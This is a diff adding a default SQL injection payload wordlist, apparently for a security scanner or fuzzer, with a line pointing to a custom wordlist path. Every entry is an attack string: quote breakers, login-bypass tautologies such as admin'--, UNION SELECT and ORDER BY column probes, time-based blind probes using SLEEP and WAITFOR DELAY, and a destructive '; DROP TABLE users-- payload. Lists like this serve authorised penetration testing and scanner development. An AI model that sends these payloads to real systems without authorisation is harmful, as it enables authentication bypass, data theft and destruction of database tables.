@@ -1,0 +1,29 @@
+# SQLi Payloads — Built-in Default List
+# Add your own by creating wordlists/custom/sqli_custom.txt
+'
+''
+`
+')
+'))
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+'; DROP TABLE users--
+admin'--
+" OR "1"="1
+" OR "1"="1"--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1 AND 1=1
+1 AND 1=2
+1 AND SLEEP(5)--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+1 OR SLEEP(5)
